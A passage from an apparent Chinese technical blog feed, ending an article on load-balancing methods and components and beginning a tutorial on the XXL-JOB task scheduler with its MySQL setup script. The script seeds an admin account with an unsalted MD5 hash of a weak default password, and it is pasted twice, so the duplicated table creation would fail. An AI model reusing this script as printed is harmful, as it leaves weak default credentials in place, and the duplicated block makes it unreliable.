中保留一段时间，那么就会导致一部分用户无法正常访问网站。这是一个致命的问题！好在这个问题可以用**动态 <code>DNS</code> **来解决。</li></ul><p>综上所述， <code>DNS</code> 负载均衡是一种粗犷的负载均衡方法，这里只做介绍，<strong>不推荐</strong>使用。 </p><h2 id="3-反向代理负载均衡"><a href="#3-反向代理负载均衡" class="headerlink" title="3. 反向代理负载均衡"></a>3. 反向代理负载均衡</h2><h3 id="3-1-什么是反向代理负载均衡？"><a href="#3-1-什么是反向代理负载均衡？" class="headerlink" title="3.1 什么是反向代理负载均衡？"></a>3.1 什么是反向代理负载均衡？</h3><p>反向代理服务器是一个位于实际服务器之前的服务器，<strong>所有向我们网站发来的请求都首先要经过反向代理服务器</strong>，服务器根据用户的请求要么直接将结果返回给用户，要么将请求交给后端服务器处理，再返回给用户。 </p><p>因为所有发送给我们网站的请求都首先经过反向代理服务器。因此，反向代理服务器就可以充当服务器集群的调度者，它<strong>可以根据当前后端服务器的负载情况，将请求转发给一台合适的服务器，并将处理结果返回给用户</strong>。  </p><h3 id="3-2-优缺点分析"><a href="#3-2-优缺点分析" class="headerlink" title="3.2 优缺点分析"></a>3.2 优缺点分析</h3><p>先说优点：</p><ul><li><strong>隐藏后端服务器</strong>。 与HTTP重定向相比，反向代理能够隐藏后端服务器，<em><strong>所有浏览器都不会与后端服务器直接交互</strong></em>，从而能够确保调度者的控制权，提升集群的整体性能；</li><li><strong>故障转移</strong>。 与<code>DNS</code>负载均衡相比，反向代理能够更快速地移除故障结点。当监控程序发现某一后端服务器出现故障时，能够及时通知反向代理服务器，并立即将其删除；</li><li><strong>合理分配任务</strong>。 HTTP重定向和<code>DNS</code>负载均衡都无法实现真正意义上的负载均衡，也就是调度服务器无法根据后端服务器的实际负载情况分配任务。但反向代理服务器支持手动设定每台后端服务器的权重。我们可以<em><strong>根据服务器的配置设置不同的权重，权重的不同会导致被调度者选中的概率的不同</strong></em>。</li></ul><p>再说缺点：</p><ul><li><strong>调度者压力过大</strong>。由于所有的请求都先由反向代理服务器处理，那么当请求量超过调度服务器的最大负载时，调度服务器的吞吐率降低会直接降低集群的整体性能；</li><li><strong>制约扩展</strong>。当后端服务器也无法满足巨大的吞吐量时，就需要增加后端服务器的数量，可没办法无限量地增加，因为会受到调度服务器的最大吞吐量的制约。</li></ul><h3 id="3-3-粘滞会话"><a href="#3-3-粘滞会话" class="headerlink" title="3.3 粘滞会话"></a>3.3 粘滞会话</h3><p>反向代理服务器会引起一个问题：若某台后端服务器处理了用户的请求，并保存了该用户的session或存储了缓存，那么当该用户再次发送请求时，<strong>无法保证该请求仍然由保存了其Session或缓存的服务器处理</strong>，若由其他服务器处理，先前的Session或缓存就找不到了。 </p><p>通常以下两种解决方法：</p><ul><li>可以修改反向代理服务器的任务分配策略，以用户<code>IP</code>作为标识较为合适。相同的用户<code>IP</code>会交由同一台后端服务器处理，从而就避免了粘滞会话的问题；</li><li>可以在Cookie中标注请求的服务器ID，当再次提交请求时，调度者将该请求分配给Cookie中标注的服务器处理即可。</li></ul><h2 id="4-2层-or-3层做负载均衡"><a href="#4-2层-or-3层做负载均衡" class="headerlink" title="4. 2层 or 3层做负载均衡"></a>4. 2层 or 3层做负载均衡</h2><h3 id="4-1-2层负载均衡"><a href="#4-1-2层负载均衡" class="headerlink" title="4.1 2层负载均衡"></a>4.1 2层负载均衡</h3><p>即<strong>在数据链路层做负载均衡</strong>。通过修改数据链路层的<code>mac</code>地址，<code>IP</code>使用的是虚拟<code>IP</code>，来实现负载均衡，解决响应数据体量过大效率低的问题。当客户端请求服务器时，负载均衡服务器替换<code>mac</code>地址为计算服务器，替换<code>IP</code>为负载均衡服务器<code>IP</code>，计算服务器直接响应数据到客户端。</p><p><strong>这种负载均衡方式吞吐量最高，大型互联网公司都是采用这种负载均衡方式</strong>。LVS负载均衡是结合了<code>IP</code>层和数据链路层的负载均衡方式，linux通过配置可以实现这两种负载均衡方式。</p><h3 id="4-2-3层负载均衡"><a href="#4-2-3层负载均衡" class="headerlink" title="4.2 3层负载均衡"></a>4.2 3层负载均衡</h3><p>网络层负载均衡。对网络层的<code>IP</code>地址进行替换，不需要在http层（应用层）工作，直接在操作系统内核的<code>IP</code>数据包中替换地址，效率比基于HTTP层的反向代理高。但是有个缺点是：请求和响应度需要经过负载均衡服务器进行<code>IP</code>层替换，响应数据会成为后期的瓶颈。 </p><h1 id="二、负载均衡组件"><a href="#二、负载均衡组件" class="headerlink" title="二、负载均衡组件"></a>二、负载均衡组件</h1><h2 id="1-Apache"><a href="#1-Apache" class="headerlink" title="1. Apache"></a>1. Apache</h2><p>它是Apache软件基金会的一个开放源代码的跨平台的网页服务器，属于老牌的web服务器了，支持基于Ip或者域名的虚拟主机，支持代理服务器，支持安全Socket层(SSL)等等，目前互联网主要使用它做静态资源服务器，也可以做代理服务器转发请求(如：图片链等)，结合tomcat等servlet容器处理jsp。 </p><h2 id="2-Nginx"><a href="#2-Nginx" class="headerlink" title="2. Nginx"></a>2. Nginx</h2><p>俄罗斯人开发的一个高性能的 HTTP和反向代理服务器。由于Nginx 超越 Apache 的高性能和稳定性，使得<strong>国内使用 Nginx 作为 Web 服务器的网站也越来越多，其中包括新浪博客、新浪播客、网易新闻、腾讯网、搜狐博客等门户网站频道等</strong>，在3w以上的高并发环境下，ngnix处理能力相当于apache的10倍。</p><h2 id="3-lvs"><a href="#3-lvs" class="headerlink" title="3. lvs"></a>3. lvs</h2><p>​    Linux Virtual Server的简写，意即Linux虚拟服务器，是一个虚拟的服务器集群系统。由毕业于国防科技大学的章文嵩博士于1998年5月创立，可以实现LINUX平台下的简单负载均衡。了解更多，访问官网：<a href="http://zh.linuxvirtualserver.org./">http://zh.linuxvirtualserver.org。</a></p><h2 id="4-HAProxy"><a href="#4-HAProxy" class="headerlink" title="4. HAProxy"></a>4. HAProxy</h2><p><strong>HAProxy提供高可用性、负载均衡以及基于TCP和HTTP应用的代理，支持虚拟主机，它是免费、快速并且可靠的一种解决方案</strong>。HAProxy特别适用于那些负载特大的web站点， 这些站点通常又需要会话保持或七层处理。HAProxy运行在当前的硬件上，完全可以支持数以万计的并发连接。并且它的运行模式使得它可以很简单安全的整合进您当前的架构中， 同时可以保护你的web服务器不被暴露到网络上。</p><h2 id="5-keepalived"><a href="#5-keepalived" class="headerlink" title="5. keepalived"></a>5. keepalived</h2><p>这里说的keepalived不是apache或者tomcat等某个组件上的属性字段，它也是一个组件，可以实现web服务器的高可用(HA high availably)。它可以检测web服务器的工作状态，如果该服务器出现故障被检测到，将其剔除服务器群中，直至正常工作后，keepalive会自动检测到并加入到服务器群里面。实现主备服务器发生故障时ip瞬时无缝交接。它是LVS集群节点健康检测的一个用户空间守护进程，也是LVS的引导故障转移模块（director failover）。Keepalived守护进程可以检查LVS池的状态。如果LVS服务器池当中的某一个服务器宕机了。keepalived会通过一 个setsockopt呼叫通知内核将这个节点从LVS拓扑图中移除。</p><h2 id="6-memcached"><a href="#6-memcached" class="headerlink" title="6. memcached"></a>6. memcached</h2><p>它是一个高性能分布式内存对象缓存系统。当初是Danga Interactive为了LiveJournal快速发展开发的系统，用于对业务查询数据缓存，减轻数据库的负载。其守护进程(daemon)是用C写的，但是客户端支持几乎所有语言，服务端和客户端通过简单的协议通信；在memcached里面缓存的数据必须序列化。</p><h2 id="7-terracotta"><a href="#7-terracotta" class="headerlink" title="7. terracotta"></a>7. terracotta</h2><p>一款由美国Terracotta公司开发的著名开源Java集群平台。它在JVM与Java应用之间实现了一个专门处理集群功能的抽象层，允许用户在不改变系统代码的情况下实现java应用的集群。支持数据的持久化、session的复制以及高可用(HA)。</p>]]></content>
    
    
    <categories>
      
      <category>系统架构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HAProxy</tag>
      
      <tag>Nginx</tag>
      
      <tag>Apache</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>分布式任务调度框架XXL-JOB的使用</title>
    <link href="/2022/08/24/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E6%A1%86%E6%9E%B6XXL-JOB/"/>
    <url>/2022/08/24/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E6%A1%86%E6%9E%B6XXL-JOB/</url>
    
    <content type="html"><![CDATA[<h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><p>在平时的业务场景中，经常有一些场景需要使用定时任务，比如：</p><ul><li><p>时间驱动的场景：某个时间点发送优惠券，发送短信等等；</p></li><li><p>批量处理数据：批量统计上个月的账单，统计上个月销售数据等等；</p></li><li><p>固定频率的场景：每隔5分钟需要执行一次。</p></li></ul><p>所以定时任务在平时开发中并不少见，而且对于现在快速消费的时代，每天都需要发送各种推送，消息都需要依赖定时任务去完成，应用非常广泛。</p><h1 id="二、为什么需要任务调度平台"><a href="#二、为什么需要任务调度平台" class="headerlink" title="二、为什么需要任务调度平台"></a>二、为什么需要任务调度平台</h1><p>在Java中，传统的定时任务实现方案，比如<code>Timer</code>，<code>Quartz</code>等都或多或少存在一些问题：不支持集群、不支持统计、没有管理平台、没有失败报警、没有监控等等而且在现在分布式的架构中，有一些场景需要分布式任务调度：</p><ul><li><p>同一个服务多个实例的任务存在互斥时，需要统一的调度；</p></li><li><p>任务调度需要支持高可用、监控、故障告警；</p></li><li><p>需要统一管理和追踪各个服务节点任务调度的结果，需要记录保存任务属性信息等。</p></li></ul><p>显然传统的定时任务已经不满足现在的分布式架构，所以需要一个分布式任务调度平台，目前比较主流的是<code>ElasticJob</code>和<code>XXL-JOB</code>。</p><h2 id="2-1-ElasticJob"><a href="#2-1-ElasticJob" class="headerlink" title="2.1 ElasticJob"></a>2.1 ElasticJob</h2><p><code>ElasticJob</code> 由当当网开源，目前<code>github</code>有6.5k的Star，使用的公司在官网登记有76家。 跟xxl-job不同的是，<code>ElasticJob</code> 是采用 <code>Zookeeper</code> 实现分布式协调，实现任务高可用以及分片。</p><p>  <img src="/../blog-assets/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E6%A1%86%E6%9E%B6XXL-JOB/640.png" alt="图片"> </p><h2 id="2-2-XXL-JOB"><a href="#2-2-XXL-JOB" class="headerlink" title="2.2 XXL-JOB"></a>2.2 XXL-JOB</h2><p>实际上更多公司选择<code>xxl-job</code>，目前<code>xxl-job</code>的<code>github</code>上有15.7k个star，登记公司有348个。毫无疑问<code>elasticjob</code>和<code>xxl-job</code>都是非常优秀的技术框架，接下来我们进一步对比讨论，探索一下为什么更多公司会选择<code>xxl-job</code>。 </p><p>首先先介绍一下<code>xxl-job</code>，这是出自大众点评许雪里(xxl就是作者名字的拼音首字母)的开源项目，官网上介绍这是一个轻量级分布式任务调度框架，其核心设计目标是开发迅速、学习简单、轻量级、易扩展。跟<code>elasticjob</code>不同，<code>xxl-job</code> 环境依赖于 <code>mysql</code>，不用<code>ZooKeeper</code>，这也是最大的不同。  </p><p><code>elasticjob</code>的初衷是为了面对高并发复杂的业务，即使是在业务量大，服务器多的时候也能做好任务调度，尽可能的利用服务器的资源。使用<code>ZooKeeper</code>使其具有高可用、一致性的，而且还具有良好的扩展性。官网上写<strong>elasticjob是无中心化的，通过ZooKeeper的选举机制选举出主服务器，如果主服务器挂了，会重新选举新的主服务器。因此elasticjob具有良好的扩展性和可用性，但是使用和运维有一定的复杂性</strong>。 </p><p><code>xxl-job</code>则相反，是通过一个中心式的调度平台，调度多个执行器执行任务，调度中心<strong>通过DB锁保证集群分布式调度的一致性</strong>，这样扩展执行器会增大DB的压力，但是如果实际上这里数据库只是负责任务的调度执行。但是如果没有大量的执行器的话和任务的情况，是不会造成数据库压力的。实际上大部分公司任务数，执行器并不多（虽然面试经常会问一些高并发的问题）。 </p><h2 id="2-3-为什么选择-XXL-JOB"><a href="#2-3-为什么选择-XXL-JOB" class="headerlink" title="2.3 为什么选择 XXL-JOB"></a>2.3 为什么选择 XXL-JOB</h2><p>相对来说，<code>xxl-job</code> 中心式的调度平台<strong>轻量级，开箱即用，操作简易，上手快，与 <code>SpringBoot</code> 有非常好的集成</strong>，而且监控界面就集成在调度中心，界面又简洁，对于<strong>企业维护起来成本不高，还有失败的邮件告警</strong>等等。这就使很多企业选择 <code>xxl-job</code> 做调度平台。 </p><h1 id="三、安装与执行"><a href="#三、安装与执行" class="headerlink" title="三、安装与执行"></a>三、安装与执行</h1><h2 id="3-1-MySQL-数据库初始化"><a href="#3-1-MySQL-数据库初始化" class="headerlink" title="3.1 MySQL 数据库初始化"></a>3.1 MySQL 数据库初始化</h2><p>前面讲过 <code>xxl-job</code> 需要依赖<code>mysql</code>，所以需要初始化数据库， 在<code>mysql</code>上运行以下 <code>sql</code> 文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE database if NOT EXISTS `xxl_job` default character set utf8mb4 collate utf8mb4_unicode_ci;<br>use `xxl_job`;<br><br>SET NAMES utf8mb4;<br><br>CREATE TABLE `xxl_job_info` (<br>  `id` int(11) NOT NULL AUTO_INCREMENT,<br>  `job_group` int(11) NOT NULL COMMENT &#x27;执行器主键ID&#x27;,<br>  `job_desc` varchar(255) NOT NULL,<br>  `add_time` datetime DEFAULT NULL,<br>  `update_time` datetime DEFAULT NULL,<br>  `author` varchar(64) DEFAULT NULL COMMENT &#x27;作者&#x27;,<br>  `alarm_email` varchar(255) DEFAULT NULL COMMENT &#x27;报警邮件&#x27;,<br>  `schedule_type` varchar(50) NOT NULL DEFAULT &#x27;NONE&#x27; COMMENT &#x27;调度类型&#x27;,<br>  `schedule_conf` varchar(128) DEFAULT NULL COMMENT &#x27;调度配置，值含义取决于调度类型&#x27;,<br>  `misfire_strategy` varchar(50) NOT NULL DEFAULT &#x27;DO_NOTHING&#x27; COMMENT &#x27;调度过期策略&#x27;,<br>  `executor_route_strategy` varchar(50) DEFAULT NULL COMMENT &#x27;执行器路由策略&#x27;,<br>  `executor_handler` varchar(255) DEFAULT NULL COMMENT &#x27;执行器任务handler&#x27;,<br>  `executor_param` varchar(512) DEFAULT NULL COMMENT &#x27;执行器任务参数&#x27;,<br>  `executor_block_strategy` varchar(50) DEFAULT NULL COMMENT &#x27;阻塞处理策略&#x27;,<br>  `executor_timeout` int(11) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;任务执行超时时间，单位秒&#x27;,<br>  `executor_fail_retry_count` int(11) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;失败重试次数&#x27;,<br>  `glue_type` varchar(50) NOT NULL COMMENT &#x27;GLUE类型&#x27;,<br>  `glue_source` mediumtext COMMENT &#x27;GLUE源代码&#x27;,<br>  `glue_remark` varchar(128) DEFAULT NULL COMMENT &#x27;GLUE备注&#x27;,<br>  `glue_updatetime` datetime DEFAULT NULL COMMENT &#x27;GLUE更新时间&#x27;,<br>  `child_jobid` varchar(255) DEFAULT NULL COMMENT &#x27;子任务ID，多个逗号分隔&#x27;,<br>  `trigger_status` tinyint(4) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;调度状态：0-停止，1-运行&#x27;,<br>  `trigger_last_time` bigint(13) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;上次调度时间&#x27;,<br>  `trigger_next_time` bigint(13) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;下次调度时间&#x27;,<br>  PRIMARY KEY (`id`)<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;<br><br>CREATE TABLE `xxl_job_log` (<br>  `id` bigint(20) NOT NULL AUTO_INCREMENT,<br>  `job_group` int(11) NOT NULL COMMENT &#x27;执行器主键ID&#x27;,<br>  `job_id` int(11) NOT NULL COMMENT &#x27;任务，主键ID&#x27;,<br>  `executor_address` varchar(255) DEFAULT NULL COMMENT &#x27;执行器地址，本次执行的地址&#x27;,<br>  `executor_handler` varchar(255) DEFAULT NULL COMMENT &#x27;执行器任务handler&#x27;,<br>  `executor_param` varchar(512) DEFAULT NULL COMMENT &#x27;执行器任务参数&#x27;,<br>  `executor_sharding_param` varchar(20) DEFAULT NULL COMMENT &#x27;执行器任务分片参数，格式如 1/2&#x27;,<br>  `executor_fail_retry_count` int(11) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;失败重试次数&#x27;,<br>  `trigger_time` datetime DEFAULT NULL COMMENT &#x27;调度-时间&#x27;,<br>  `trigger_code` int(11) NOT NULL COMMENT &#x27;调度-结果&#x27;,<br>  `trigger_msg` text COMMENT &#x27;调度-日志&#x27;,<br>  `handle_time` datetime DEFAULT NULL COMMENT &#x27;执行-时间&#x27;,<br>  `handle_code` int(11) NOT NULL COMMENT &#x27;执行-状态&#x27;,<br>  `handle_msg` text COMMENT &#x27;执行-日志&#x27;,<br>  `alarm_status` tinyint(4) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;告警状态：0-默认、1-无需告警、2-告警成功、3-告警失败&#x27;,<br>  PRIMARY KEY (`id`),<br>  KEY `I_trigger_time` (`trigger_time`),<br>  KEY `I_handle_code` (`handle_code`)<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;<br><br>CREATE TABLE `xxl_job_log_report` (<br>  `id` int(11) NOT NULL AUTO_INCREMENT,<br>  `trigger_day` datetime DEFAULT NULL COMMENT &#x27;调度-时间&#x27;,<br>  `running_count` int(11) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;运行中-日志数量&#x27;,<br>  `suc_count` int(11) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;执行成功-日志数量&#x27;,<br>  `fail_count` int(11) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;执行失败-日志数量&#x27;,<br>  `update_time` datetime DEFAULT NULL,<br>  PRIMARY KEY (`id`),<br>  UNIQUE KEY `i_trigger_day` (`trigger_day`) USING BTREE<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;<br><br>CREATE TABLE `xxl_job_logglue` (<br>  `id` int(11) NOT NULL AUTO_INCREMENT,<br>  `job_id` int(11) NOT NULL COMMENT &#x27;任务，主键ID&#x27;,<br>  `glue_type` varchar(50) DEFAULT NULL COMMENT &#x27;GLUE类型&#x27;,<br>  `glue_source` mediumtext COMMENT &#x27;GLUE源代码&#x27;,<br>  `glue_remark` varchar(128) NOT NULL COMMENT &#x27;GLUE备注&#x27;,<br>  `add_time` datetime DEFAULT NULL,<br>  `update_time` datetime DEFAULT NULL,<br>  PRIMARY KEY (`id`)<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;<br><br>CREATE TABLE `xxl_job_registry` (<br>  `id` int(11) NOT NULL AUTO_INCREMENT,<br>  `registry_group` varchar(50) NOT NULL,<br>  `registry_key` varchar(255) NOT NULL,<br>  `registry_value` varchar(255) NOT NULL,<br>  `update_time` datetime DEFAULT NULL,<br>  PRIMARY KEY (`id`),<br>  KEY `i_g_k_v` (`registry_group`,`registry_key`,`registry_value`)<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;<br><br>CREATE TABLE `xxl_job_group` (<br>  `id` int(11) NOT NULL AUTO_INCREMENT,<br>  `app_name` varchar(64) NOT NULL COMMENT &#x27;执行器AppName&#x27;,<br>  `title` varchar(12) NOT NULL COMMENT &#x27;执行器名称&#x27;,<br>  `address_type` tinyint(4) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;执行器地址类型：0=自动注册、1=手动录入&#x27;,<br>  `address_list` text COMMENT &#x27;执行器地址列表，多地址逗号分隔&#x27;,<br>  `update_time` datetime DEFAULT NULL,<br>  PRIMARY KEY (`id`)<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;<br><br>CREATE TABLE `xxl_job_user` (<br>  `id` int(11) NOT NULL AUTO_INCREMENT,<br>  `username` varchar(50) NOT NULL COMMENT &#x27;账号&#x27;,<br>  `password` varchar(50) NOT NULL COMMENT &#x27;密码&#x27;,<br>  `role` tinyint(4) NOT NULL COMMENT &#x27;角色：0-普通用户、1-管理员&#x27;,<br>  `permission` varchar(255) DEFAULT NULL COMMENT &#x27;权限：执行器ID列表，多个逗号分割&#x27;,<br>  PRIMARY KEY (`id`),<br>  UNIQUE KEY `i_username` (`username`) USING BTREE<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;<br><br>CREATE TABLE `xxl_job_lock` (<br>  `lock_name` varchar(50) NOT NULL COMMENT &#x27;锁名称&#x27;,<br>  PRIMARY KEY (`lock_name`)<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;<br><br>INSERT INTO `xxl_job_group`(`id`, `app_name`, `title`, `address_type`, `address_list`, `update_time`) VALUES (1, &#x27;xxl-job-executor-sample&#x27;, &#x27;示例执行器&#x27;, 0, NULL, &#x27;2018-11-03 22:21:31&#x27; );<br>INSERT INTO `xxl_job_info`(`id`, `job_group`, `job_desc`, `add_time`, `update_time`, `author`, `alarm_email`, `schedule_type`, `schedule_conf`, `misfire_strategy`, `executor_route_strategy`, `executor_handler`, `executor_param`, `executor_block_strategy`, `executor_timeout`, `executor_fail_retry_count`, `glue_type`, `glue_source`, `glue_remark`, `glue_updatetime`, `child_jobid`) VALUES (1, 1, &#x27;测试任务1&#x27;, &#x27;2018-11-03 22:21:31&#x27;, &#x27;2018-11-03 22:21:31&#x27;, &#x27;XXL&#x27;, &#x27;&#x27;, &#x27;CRON&#x27;, &#x27;0 0 0 * * ? *&#x27;, &#x27;DO_NOTHING&#x27;, &#x27;FIRST&#x27;, &#x27;demoJobHandler&#x27;, &#x27;&#x27;, &#x27;SERIAL_EXECUTION&#x27;, 0, 0, &#x27;BEAN&#x27;, &#x27;&#x27;, &#x27;GLUE代码初始化&#x27;, &#x27;2018-11-03 22:21:31&#x27;, &#x27;&#x27;);<br>INSERT INTO `xxl_job_user`(`id`, `username`, `password`, `role`, `permission`) VALUES (1, &#x27;admin&#x27;, &#x27;e10adc3949ba59abbe56e057f20f883e&#x27;, 1, NULL);<br>INSERT INTO `xxl_job_lock` ( `lock_name`) VALUES ( &#x27;schedule_lock&#x27;);<br><br>commit;<br>CREATE database if NOT EXISTS `xxl_job` default character set utf8mb4 collate utf8mb4_unicode_ci;<br>use `xxl_job`;<br><br>SET NAMES utf8mb4;<br><br>CREATE TABLE `xxl_job_info` (<br>  `id` int(11) NOT NULL AUTO_INCREMENT,<br>  `job_group` int(11) NOT NULL COMMENT &#x27;执行器主键ID&#x27;,<br>  `job_desc` varchar(255) NOT NULL,<br>  `add_time` datetime DEFAULT NULL,<br>  `update_time` datetime DEFAULT NULL,<br>  `author` varchar(64) DEFAULT NULL COMMENT &#x27;作者&#x27;,<br>  `alarm_email` varchar(255) DEFAULT NULL COMMENT &#x27;报警邮件&#x27;,<br>  `schedule_type` varchar(50) NOT NULL DEFAULT &#x27;NONE&#x27; COMMENT &#x27;调度类型&#x27;,<br>  `schedule_conf` varchar(128) DEFAULT NULL COMMENT &#x27;调度配置，值含义取决于调度类型&#x27;,<br>  `misfire_strategy` varchar(50) NOT NULL DEFAULT &#x27;DO_NOTHING&#x27; COMMENT &#x27;调度过期策略&#x27;,<br>  `executor_route_strategy` varchar(50) DEFAULT NULL COMMENT &#x27;执行器路由策略&#x27;,<br>  `executor_handler` varchar(255) DEFAULT NULL COMMENT &#x27;执行器任务handler&#x27;,<br>  `executor_param` varchar(512) DEFAULT NULL COMMENT &#x27;执行器任务参数&#x27;,<br>  `executor_block_strategy` varchar(50) DEFAULT NULL COMMENT &#x27;阻塞处理策略&#x27;,<br>  `executor_timeout` int(11) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;任务执行超时时间，单位秒&#x27;,<br>  `executor_fail_retry_count` int(11) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;失败重试次数&#x27;,<br>  `glue_type` varchar(50) NOT NULL COMMENT &#x27;GLUE类型&#x27;,<br>  `glue_source` mediumtext COMMENT &#x27;GLUE源代码&#x27;,<br>  `glue_remark` varchar(128) DEFAULT NULL COMMENT &#x27;GLUE备注&#x27;,<br>  `glue_updatetime` datetime DEFAULT NULL COMMENT &#x27;GLUE更新时间&#x27;,<br>  `child_jobid` varchar(255) DEFAULT NULL COMMENT &#x27;子任务ID，多个逗号分隔&#x27;,<br>  `trigger_status` tinyint(4) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;调度状态：0-停止，1-运行&#x27;,<br>  `trigger_last_time` bigint(13) NOT NULL DEFAULT &#x27;0&#x27; COMMENT 